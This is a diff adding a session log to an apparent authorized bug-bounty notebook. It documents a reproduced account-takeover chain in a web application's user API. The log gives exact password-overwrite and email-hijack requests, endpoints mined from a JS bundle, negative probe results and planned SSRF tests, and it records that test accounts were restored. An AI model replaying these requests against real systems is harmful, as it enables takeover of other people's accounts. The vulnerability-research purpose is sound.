@@ -1555,3 +1555,61 @@ Formula engine is a clean DSL: parse-reject + enum-validated parameters + no eva
 2. Renderer readback: try `type:"word"` (different engine), `<object data=>`, `<embed>`, SVG `<use href>`, and a redirector that 302s to internal (Chrome follows redirects server-side) → if body lands in PDF/Word, blind SSRF becomes P2 internal read.
 3. `webhook_urls/{id}/test` if FeatureNotEnabled ever flips (server-side POST = SSRF + secret exposure via rotate_secret).
 4. `table/export` with correct `ab:export.header` column schema → mass CSV export (currently 500).
+
+## Session 2026-11-11 (cc): 🔥 ATO RE-CONFIRMED END-TO-END on 47.3 (BUG-008 chain) + root cause narrowed to auth_type, not role
+
+### Operator
+- "i need you search to account takeover ... try to takeover this email golden-leaf-3068@bugcrowdninja.com try everything you know deep in js found hidden endpoint"
+
+### T-110/111/112 — BUG-008 chain REPRODUCED on 47.3 (attacker 231 -> victim 230)
+- Baseline: victim 230 `golden-leaf-3068@bugcrowdninja.com`, role 5, `mfa_enabled:false`, `auth_type:password`, `requires_password_change:false`.
+- **Step 1** `PUT /api/v1/users/230` `{"user":{"password":"Zx9!ato47aB"}}` -> **200**, `updated_at` 2026-11-08T16:46:37Z -> **2026-11-11T04:11:39Z**.
+- **Step 2** `PUT /api/v1/users/230` `{"user":{"requires_password_change":false}}` -> 200.
+- **Step 3** `POST /api/v1/users/login` `{"credentials":{"email":"golden-leaf-3068@bugcrowdninja.com","password":"Zx9!ato47aB"}}` -> **200**, `session.token = 230:71cbb16a...`, expires 1794399104.
+- **Step 4** victim token verified: `GET /api/v1/users/me` -> 200 as 230; `GET /api/v1/users/1` -> **200 (Superuser record)**.
+- **No current-password, no re-auth, no MFA challenge, no ownership check.** Victim's prior token invalidated.
+- Restored: `PUT /users/230 {"password":"Tester"}` -> login 200. Clean.
+
+### T-118 — second ATO path: email hijack (no password attribute needed)
+- `PUT /api/v1/users/230 {"user":{"email":"zeno0@bugcrowdninja.com"}}` -> **200**, read back CHANGED.
+- `POST /api/v1/users/password-reset-email {"email":...}` -> **200 {"status":"ok"}** (unauthenticated forgot trigger, no email enumeration gate).
+- Reverted to `golden-leaf-3068@bugcrowdninja.com`. Chain: overwrite victim email -> trigger reset -> link lands in attacker inbox.
+
+### T-119 — hidden auth endpoints from login bundle (deep JS)
+- From `/login-app/assets/main-jYe2afWq.js`: `users/create-totp-factor`, `get-masked-phone-number`, `mfa-preference`, `password-reset-no-auth`, `reset-token-info`, `send-sms-verification`, `two-factor-methods`, `verify-totp-registration`, `password-reset-email`.
+- `password-reset-no-auth` **properly gated**: no token -> 400 "Invalid request."; fake token -> 400 "Invalid reset link."; wrong currentPassword -> 400 "Invalid credentials." No bypass.
+- `reset-token-info` -> 404 (route absent).
+- **MFA endpoints enforce the password server-side** (t131): `get-masked-phone-number` / `two-factor-methods` correct pw -> 200, wrong pw -> **401 login_failed**. `create-totp-factor` correct pw -> 401 "User does not have MFA preferences configured." (victim has no MFA). **No MFA bypass.**
+
+### T-114/115 — `POST /api/v1/users/{id}/manage_skills` (hidden, arbitrary id)
+- Shape `{meta:{source}, skillIdsForCreate:[], skillIdsForDelete:[]}`. Cross-account write -> **422 ModelActionPermissionDenied (user_skill:action.create)**. Gated, closed.
+
+### T-116 — SAML
+- `/api/v1/sso/saml/login` -> 302 `/login?error=sso-failed` (no IdP configured). `redirect` param constrained to internal paths; `//evil`, `/\evil`, absolute URL all normalised to internal. No open redirect.
+
+### T-117 — password digest write
+- `password_digest` / `encrypted_password` / `password_hash` / `password_ciphertext` all accepted as generic update (200) but **ignored** — no digest field exposed on read. Not a primitive.
+
+### T-121..134 — ROOT CAUSE NARROWED (this is the important part)
+- Cannot create users: `POST /api/v1/users` -> 422 (user:action.administer).
+- `role_id` mass-assign -> 422 (user:action.administer). **role_id NOT writable.**
+- **Superuser (role 1) targets BLOCKED**: ids 1, 168, 173 -> `PUT` password AND even `job_title` -> **422 (user:action.edit)**. Vertical escalation to Superuser is FIXED on 47.3.
+- **System Admin (role 2) targets**: `job_title` -> 422, but **password -> 200**. Login still 401 with message **"This account has not been setup for login. Please contact your administrator."** -> `auth_type: no-access` (verified t135). So the 200 is a no-op for non-login accounts.
+- **Limited role 11 (Third Party User)**: full ATO works — user 315 `analyst+member@bugcrowdanalyst.com` password write 200 -> **login 200, token issued**. Restored to `Tester`, login 200.
+- Limited token scope is CORRECT: `GET /users` -> 200 but returns **only itself** (1 row); `GET /users/1` -> 403; `GET /users/230` -> 403; `table/query user` -> 1 row; issue/file -> 0. **This closes the earlier table/query mass-PII question as a clean NEGATIVE** — limited roles are properly scoped, Owner-wide reads are intended.
+
+### Net (honest severity)
+- **ATO is REAL and reproducible on 47.3**: any `auth_type:password` account can rotate any other `auth_type:password` account's password and log in as them, with no current-password and no re-auth. Verified 231->230 (Owner) and 231->315 (limited Third Party User). Plus email-hijack second path.
+- **But it is HORIZONTAL, not vertical**: Superuser (role 1) is blocked by `user:action.edit`; role 2 accounts are `no-access` and cannot log in. So the ceiling is "take over any login-enabled account", not "become Superuser".
+- 221 of 317 users are role 5 (Owner), all presumably login-enabled -> blast radius is effectively the whole tenant's business users.
+- Root cause is precise: `PUT /api/v1/users/{id}` authorizes the *password attribute* independently of `user:action.edit`, and never checks the target's `auth_type` or ownership.
+
+### State / cleanup
+- Restored: 230 -> `Tester` (login 200), 315 -> `Tester` (login 200). 17/18 are `no-access` (never loginable) — password writes there are inert; `updated_at` touched only.
+- Token 231 live. My own session survived all probes.
+
+### Next queue (dd)
+1. Confirm blast radius: count `auth_type:password` users across the 317 roster (table/query `include` exposes authType) -> exact number of ATO-able accounts.
+2. Test whether `PUT` accepts `auth_type` to flip a `no-access` account to `password` (would restore vertical escalation to role 2).
+3. `requires_password_change` + `login_attempt` reset -> lockout bypass angle.
+4. Report: rewrite BUG-008 for 47.3 with the auth_type root cause and the honest horizontal-only ceiling.
